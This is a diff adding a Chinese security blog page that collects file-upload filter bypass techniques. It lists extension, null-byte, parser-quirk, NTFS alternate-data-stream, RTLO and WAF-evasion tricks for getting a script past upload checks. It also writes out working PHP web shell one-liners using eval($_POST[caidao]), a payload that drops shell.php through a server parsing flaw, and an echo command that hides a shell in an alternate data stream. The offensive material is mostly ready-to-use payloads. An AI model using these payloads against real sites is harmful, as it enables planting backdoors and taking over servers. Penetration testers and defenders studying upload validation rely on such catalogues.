@@ -1,0 +1,1383 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="WAF绕过,PHP,文件包含,文件上传," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="w2n1ck" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="根据个人经验,搜集总结，欢迎大牛们补充、纠错  -_-">
+<meta name="keywords" content="WAF绕过,PHP,文件包含,文件上传">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传(绕过)">
+<meta property="og:url" content="http://byd.dropsec.xyz/2017/02/21/文件上传-绕过/index.html">
+<meta property="og:site_name" content="w2n1ck">
+<meta property="og:description" content="根据个人经验,搜集总结，欢迎大牛们补充、纠错  -_-">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-07-28T11:24:52.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="文件上传(绕过)">
+<meta name="twitter:description" content="根据个人经验,搜集总结，欢迎大牛们补充、纠错  -_-">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"hide","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"输入关键词进行搜索","hits_empty":"找不到关于“${query}”的文章","hits_stats":"共找到 ${hits} 篇文化在那个，花了 ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://byd.dropsec.xyz/2017/02/21/文件上传-绕过/"/>
+
+
+
+
+
+  <title>文件上传(绕过) | w2n1ck</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?61c879c1c104a92aab1d6e4b6888ffe5";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">w2n1ck</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Looking at yourself from a different Angle!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tools">
+          <a href="/daima" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-wrench"></i> <br />
+            
+            工具
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-daohang">
+          <a href="/daohang" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-globe"></i> <br />
+            
+            导航
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://byd.dropsec.xyz/2017/02/21/文件上传-绕过/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="w2n1ck">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="w2n1ck">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">文件上传(绕过)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-02-21T14:09:51+08:00">
+                2017-02-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/02/21/文件上传-绕过/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/02/21/文件上传-绕过/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>根据个人经验,搜集总结，欢迎大牛们补充、纠错  -_-<br><a id="more"></a></p>
+<h1 id="文件上传校验姿势"><a href="#文件上传校验姿势" class="headerlink" title="文件上传校验姿势"></a>文件上传校验姿势</h1><ul>
+<li>客户端javascript校验（一般只校验后缀名）</li>
+<li>服务端校验</li>
+<li>文件头<code>content-type</code>字段校验（image/gif）</li>
+<li>文件内容头校验（GIF89a）</li>
+<li>后缀名黑名单校验</li>
+<li>后缀名白名单校验</li>
+<li>自定义正则校验</li>
+<li>WAF设备校验（根据不同的WAF产品而定）</li>
+</ul>
+<h1 id="文件上传绕过校验姿势"><a href="#文件上传绕过校验姿势" class="headerlink" title="文件上传绕过校验姿势"></a>文件上传绕过校验姿势</h1><ul>
+<li>客户端绕过（抓包改包）</li>
+<li>服务端绕过</li>
+<li>文件类型</li>
+<li>文件头</li>
+<li>文件后缀名</li>
+<li>配合文件包含漏洞绕过</li>
+<li>配合服务器解析漏洞绕过</li>
+<li>CMS、编辑器漏洞绕过</li>
+<li>配合操作系统文件命名规则绕过</li>
+<li>配合其他规则绕过</li>
+<li>WAF绕过</li>
+<li>黑名单绕过</li>
+<li>白名单绕过</li>
+</ul>
+<h2 id="1-客户端绕过"><a href="#1-客户端绕过" class="headerlink" title="1.客户端绕过"></a>1.客户端绕过</h2><p>可以利用burp等抓包改包，先上传一个gif类型的木马，然后通过burp将其改为<code>asp/php/jsp</code>后缀名即可。</p>
+<h2 id="2-服务端绕过"><a href="#2-服务端绕过" class="headerlink" title="2.服务端绕过"></a>2.服务端绕过</h2><h3 id="2-1-文件类型绕过"><a href="#2-1-文件类型绕过" class="headerlink" title="2.1 文件类型绕过"></a>2.1 文件类型绕过</h3><p>我们可以通过抓包，将<code>content-type</code>字段改为<code>image/gif</code></p>
+<h3 id="2-2-文件头绕过"><a href="#2-2-文件头绕过" class="headerlink" title="2.2 文件头绕过"></a>2.2 文件头绕过</h3><p>在木马文件内容开头加上一些文件头信息</p>
+<blockquote>
+<p>GIF89a&lt;?php phpinfo(); ?&gt;</p>
+</blockquote>
+<p>判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">（1）  .JPEG;.JPE;.JPG，”JPGGraphic File”</div><div class="line">（2）  .gif，”GIF 89A”</div><div class="line">（3）  .zip，”Zip Compressed”</div><div class="line">（4）  .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</div></pre></td></tr></table></figure></p>
+<h3 id="2-3-文件名-后缀绕过"><a href="#2-3-文件名-后缀绕过" class="headerlink" title="2.3 文件名/后缀绕过"></a>2.3 文件名/后缀绕过</h3><h4 id="2-3-1-截断"><a href="#2-3-1-截断" class="headerlink" title="2.3.1 截断"></a>2.3.1 截断</h4><p><code>test.php%00.jpg</code>,<code>test.php0xoo.jpg</code></p>
+<h4 id="2-3-2-windows特性"><a href="#2-3-2-windows特性" class="headerlink" title="2.3.2 windows特性"></a>2.3.2 windows特性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">ADS流：test.php::$DATA(见下)</div><div class="line">test.php.</div><div class="line">test.php_</div><div class="line">test.php(空格)</div><div class="line">*=.</div><div class="line">&lt;=*</div><div class="line">&gt;=?</div><div class="line">test.&lt;&lt;&lt;</div><div class="line">test.php:1.jpg会生成一个test.php的空文件</div></pre></td></tr></table></figure>
+<h4 id="2-3-3-ASP"><a href="#2-3-3-ASP" class="headerlink" title="2.3.3 ASP"></a>2.3.3 ASP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">解析漏洞:</div><div class="line">.asp;.jpg</div><div class="line">.asp.jpg</div><div class="line">.asp;jpg</div><div class="line">+111.asp;+222.jpg</div><div class="line">/111.asp/1.jpg</div><div class="line">/111.aspx/1.jpg</div><div class="line">后缀名：</div><div class="line">asa,cer,cdx,ashx,asmx,xml,htr,asax</div><div class="line">双文件扩展：</div><div class="line">test.asp.jpg</div><div class="line">RTLO：</div><div class="line">asp.html-内容为一句话</div><div class="line">php.txt-内容为一句话</div></pre></td></tr></table></figure>
+<h4 id="2-3-4-JSP"><a href="#2-3-4-JSP" class="headerlink" title="2.3.4 JSP"></a>2.3.4 JSP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">.jsp.jpg.jsp-用两个jsp包围中间的jpg</div><div class="line">后缀名：jspf,jspa,jsps</div></pre></td></tr></table></figure>
+<h4 id="2-3-5-PHP"><a href="#2-3-5-PHP" class="headerlink" title="2.3.5 PHP"></a>2.3.5 PHP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">后缀名：.php3 ,.php5,.php7</div><div class="line">大小写：pHp</div><div class="line">解析漏洞：</div><div class="line">1.php.jpg</div><div class="line">1.jpg.php</div><div class="line">1.php  jpg(jpg前面两个空格)</div><div class="line">1.php jpg(jpg前面一个空格)</div><div class="line">/1.jpg/1.php</div><div class="line">/1.jpg%00.php</div><div class="line">/1.jpg/.php</div><div class="line">/1.jpg/php</div><div class="line">特殊文件利用：</div><div class="line">.htaccess</div><div class="line">.user.ini</div></pre></td></tr></table></figure>
+<h3 id="3-配合文件包含漏洞"><a href="#3-配合文件包含漏洞" class="headerlink" title="3.配合文件包含漏洞"></a>3.配合文件包含漏洞</h3><ol>
+<li>上传一个符合条件格式的文档，文档内容为一句话木马，eg：test.txt</li>
+<li>利用文件包含漏洞包含上传的木马文件,eg:page?id=D:/www/test.txt</li>
+</ol>
+<h3 id="4-配合服务器解析漏洞"><a href="#4-配合服务器解析漏洞" class="headerlink" title="4.配合服务器解析漏洞"></a>4.配合服务器解析漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">IIS5.x-6.x:</div><div class="line">目录解析(6.0):/1.asp/1.jpg</div><div class="line">文件解析:1.asp;.jpg</div><div class="line">文件类型:1.asa,a.cer,1.cdx</div><div class="line">IIS7.5：</div><div class="line">IIS7.5是由于php配置文件中，开启了cgi.fix_pathinf</div><div class="line">Apache:</div><div class="line">从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断</div><div class="line">后缀不识别：1.php.php123</div><div class="line">配置错误：1.php.jpg</div><div class="line">Nginx：</div><div class="line">Nginx默认是以CGI的方式支持PHP解析的，和IIS7.5一样开启了cgi.fix_pathinf</div><div class="line">1.jpg/1.php</div><div class="line">1.jpg%00.php</div><div class="line">1.jpg/%20\1.php</div><div class="line">上传一个名字为test.jpg，以下内容的文件</div><div class="line">&lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[caidao])?&gt;&apos;);?&gt;</div><div class="line">然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php</div></pre></td></tr></table></figure>
+<h3 id="5-配合操作系统文件命令规则"><a href="#5-配合操作系统文件命令规则" class="headerlink" title="5.配合操作系统文件命令规则"></a>5.配合操作系统文件命令规则</h3><ol>
+<li><p>上传不符合windows文件命名规则的文件名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">test.asp.</div><div class="line">test.asp(空格)</div><div class="line">test.php:1.jpg</div><div class="line">test.php::$DATA</div><div class="line">shell.php::$DATA…….</div><div class="line">会被windows系统自动去掉不符合规则符号后面的内容。</div></pre></td></tr></table></figure>
+</li>
+<li><p>linux下后缀名大小写<br>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</p>
+<h3 id="6-CMS、编辑器漏洞"><a href="#6-CMS、编辑器漏洞" class="headerlink" title="6.CMS、编辑器漏洞"></a>6.CMS、编辑器漏洞</h3></li>
+</ol>
+<ul>
+<li>CMS漏洞：针对不同CMS存在的上传漏洞进行绕过。</li>
+<li>编辑器漏洞：比如FCK，Ewebeditor等，可以针对编辑器的漏洞进行绕过。</li>
+</ul>
+<h3 id="7-其他规则"><a href="#7-其他规则" class="headerlink" title="7.其他规则"></a>7.其他规则</h3><h4 id="7-1-利用waf特性"><a href="#7-1-利用waf特性" class="headerlink" title="7.1 利用waf特性"></a>7.1 利用waf特性</h4><ul>
+<li>在恶意代码前加垃圾数据；</li>
+<li>在数据包前加垃圾数据；</li>
+<li>在Content-Disposition参数后面加垃圾数据；</li>
+<li>多加一个filename；</li>
+<li>更改HTTP请求方法；</li>
+<li>删除实体里面的Conten-Type字段；<blockquote>
+<p>第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。</p>
+</blockquote>
+</li>
+<li>删除Content-Disposition字段里的空格</li>
+<li>增加一个空格</li>
+<li>修改Content-Disposition字段值的大小写</li>
+<li>文件名后缀处回车</li>
+<li>多个Content-Disposition<h4 id="7-2-利用NTFS-ADS特性"><a href="#7-2-利用NTFS-ADS特性" class="headerlink" title="7.2 利用NTFS ADS特性"></a>7.2 利用NTFS ADS特性</h4>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">test.php:a.jpg　　　　　　　　　生成test.php  空</div><div class="line">test.php::$INDEX_ALLOCATION  生成test.php文件夹  </div><div class="line">test.php::$DATA\1.jpg  　　　生成1.jpg(不可见的)</div><div class="line">echo ^&lt;?php @eval(request[caidao])?^&gt;  &gt; index.php:hidden.jpg</div><div class="line">这样子就生成了一个不可见的shell hidden.jpg，常规的文件管理器、type命令，dir命令、del命令发现都找不出那个hidden.jpg的。我们可以在另外一个正常文件里把这个ADS文件include进去，&lt;?php include(‘index.php:hidden.jpg’)?&gt;，这样子就可以正常解析我们的一句话了</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="7-3-利用RTLO"><a href="#7-3-利用RTLO" class="headerlink" title="7.3 利用RTLO"></a>7.3 利用RTLO</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">新建一个文件php.html</div><div class="line">内容为：&lt;?php @eval($_POST[&apos;caidao&apos;]);?&gt;</div><div class="line">重命名文件：输入名字的文本框里点右键，选择“插入unicode控制字符”，然后就到了这个菜单栏，我们选择RLO</div><div class="line">这个时候php.html已经变成了html.php了</div></pre></td></tr></table></figure>
+<h4 id="7-4-特殊的长文件名绕过"><a href="#7-4-特殊的长文件名绕过" class="headerlink" title="7.4 特殊的长文件名绕过"></a>7.4 特殊的长文件名绕过</h4><p>文件名使用非字母数字，比如中文等最大程度的拉长<br><code>shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg</code></p>
+<h4 id="7-5-反删除"><a href="#7-5-反删除" class="headerlink" title="7.5 反删除"></a>7.5 反删除</h4><p>将<code>name=&quot;file1&quot;</code>改成了file4，可以防止文件删除（JCMS漏洞）</p>
+<h4 id="7-8-图片转换-二次渲染-文件幻数检测"><a href="#7-8-图片转换-二次渲染-文件幻数检测" class="headerlink" title="7.8 图片转换/二次渲染/文件幻数检测"></a>7.8 图片转换/二次渲染/文件幻数检测</h4><ul>
+<li>在不破坏文件本身渲染情况下，在空白区进行代码填充，一般是图片注释</li>
+<li>溢出攻击</li>
+<li>绕过GD库</li>
+</ul>
+<p>…</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>大爷，赏个铜板呗！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/images/weixin.png" alt="w2n1ck WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/images/zhifubao.png" alt="w2n1ck Alipay"/>
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+      <strong>本文作者：</strong>
+      w2n1ck
+    </li>
+    <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://byd.dropsec.xyz/2017/02/21/文件上传-绕过/" title="文件上传(绕过)">http://byd.dropsec.xyz/2017/02/21/文件上传-绕过/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong>
+      本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/WAF绕过/" rel="tag"><i class="fa fa-tag"></i> WAF绕过</a>
+          
+            <a href="/tags/PHP/" rel="tag"><i class="fa fa-tag"></i> PHP</a>
+          
+            <a href="/tags/文件包含/" rel="tag"><i class="fa fa-tag"></i> 文件包含</a>
+          
+            <a href="/tags/文件上传/" rel="tag"><i class="fa fa-tag"></i> 文件上传</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/02/13/应急响应资料整理/" rel="next" title="应急响应资料整理">
+                <i class="fa fa-chevron-left"></i> 应急响应资料整理
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/03/04/PHP弱类型-XSS的一些小tips/" rel="prev" title="PHP&XSS的一些小tips">
+                PHP&XSS的一些小tips <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="w2n1ck" />
+          <p class="site-author-name" itemprop="name">w2n1ck</p>
+           
+              <p class="site-description motion-element" itemprop="description">Looking at yourself from a different Angle!</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">74</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">53</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/w2n1ck" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://github.com/w2n1ck" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Github
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.zhihu.com/people/w2n1ck/activities" target="_blank" title="Zhihu">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Zhihu
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://wkh.dropsec.xyz" title="王小洪" target="_blank">王小洪</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://fgp.dropsec.xyz" title="冯小鹏" target="_blank">冯小鹏</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.neargle.com/" title="周小斌" target="_blank">周小斌</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://010.dropsec.xyz/" title="小光头" target="_blank">小光头</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.dropsec.xyz/" title="团队主页" target="_blank">团队主页</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.w2n1ck.com/" title="个人主页" target="_blank">个人主页</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
